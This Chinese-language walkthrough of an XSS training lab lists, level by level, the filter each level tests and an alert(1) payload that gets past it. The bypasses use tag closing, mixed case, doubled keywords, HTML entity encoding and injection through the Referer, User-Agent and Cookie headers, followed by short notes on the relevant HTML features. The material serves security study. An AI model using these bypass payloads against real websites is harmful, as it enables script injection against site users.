## 1、无过滤

```python
# Payload
?test=<script>alert(1)</script>
```



## 2、反射型

```python
# 考点
闭合标签">
```

```python
# Payload
"><script>alert(1)</script>
```



## 3、反射型

```python
# 考点
过滤<>
```

```python
# Payload
'onfocus=javascript:alert(1)>
```



## 4、反射型

```python
# 考点
过滤<>
```

```python
# Payload
"onmouseover=script:alert(1)//
```



## 5、反射型

```python
# 考点
过滤<> on
```

```python
# Payload
"><a href=javascript:alert(1)>aaa</a>//
```



## 6、反射型

```python
# 考点
过滤<> on href
```

```python
# Payload
"><a HrEf=javascript:alert(1)>aaa</a>//
```



## 7、反射型

```python
# 考点
过滤<> on javascript
```

```python
# Payload
"oonnfocus=scscriptript:alert(1)//
```



## 8、反射型

```python
# 考点
过滤：script、on、src、data、href、"
```

```python
# Payload
编码前：javascript:alert(1)
编码后：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;
```



## 9、反射型

```python
# 考点
过滤：script、on、src、data、href、"
检测：是否存在http://
```

```python
# Payload
编码前：javascript:alert(1)//http://www.baidu.com
编码后：&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;//http://www.baidu.com
```



## 10、反射型

```python
# 考点
input文本框隐藏
```

```python
# Payload
?keyword=<script>alert(%27xss%27)</script>&t_link="%20type="text"&t_history="%20type="text"&t_sort="%20type="text"%20onfocus="alert(1)
```



## 11、反射型

```php
# 考点
input文本框隐藏
Referer头XSS
```

```php
# Payload
Referer: " type="text" onclick='javascript:alert(1)'>//
```



## 12、反射型

```php
# 考点
input文本框隐藏
User-Agent头XSS
```

```php
# Payload
User-Agent: " type="text" onclick='javascript'>//
```



## 13、反射型

```php
# 考点
input文本框隐藏
Cookie头XSS
```

```php
# Payload
Cookie: " type="text" onclick='javascript'>//
```



## 15、反射型

```php
# 考点
nginclude
```

```php
# Payload
?src='level1.php?name=<img src=1 onerror=alert(1)>'
```



## 16、反射型

```php
# 考点
过滤：" / 空格 script 
```

```php
# Payload
?keyword=<img%0Asrc=ss%0Aonerror=alert(1)>
```



## 17、反射型

```php
# 考点
<embed>
```

```php
# Payload
onmouseover=alert(1)
```



## 18、反射型

```php
# 考点
<embed>
```

```php
# Payload
onmouseover=alert(1)
```



## N、知识点

### 1、onfocus

```python
# 解释
事件在对象获得焦点时发生，即点击当前页面的输入框就可以完成弹窗。常用于<input><select><a>
```

### 2、htmlspecialchars()函数

```python
# 解释
把预定义的字符转换为HTML实体
```

```python
# 预定义字符
& => &amp;
" => &quot;
' => '
< => $lt;
> => &gt;
```

### 3、nginclude

```php
# 解释
用于包含外部的HTML文件，包含的内容作为指定元素的子节点
```

```php
# 语法
<element ng-include="filename" onload="" autoscroll=""></element>
filename：文件名，可以使用表达式返回一个文件名
onload：可选，文件载入后执行的表达式
autoscroll：可选，包含的部分是否在指定视图上可滚动
```

### 4、embed

```php
# 解释
<embed>标签是HTML5中的新标签，定义了一个容器，用来嵌入外部应用或互动程序（插件）
```

```php
# 语法
<embed type="" src="" width="" height="">
```

```php
# 实例
# 1、插入图片
<embed type="image/jpg" src="https://static.runoob.com/images/runoob-logo.png" width="260" height="30">
# 2、插入HTML页面
<embed type="text/html" src="snippet.html" width="500" height="200">
# 3、插入视频
<embed type="video/webm" src="video.mp4" width="400" height="300">
```

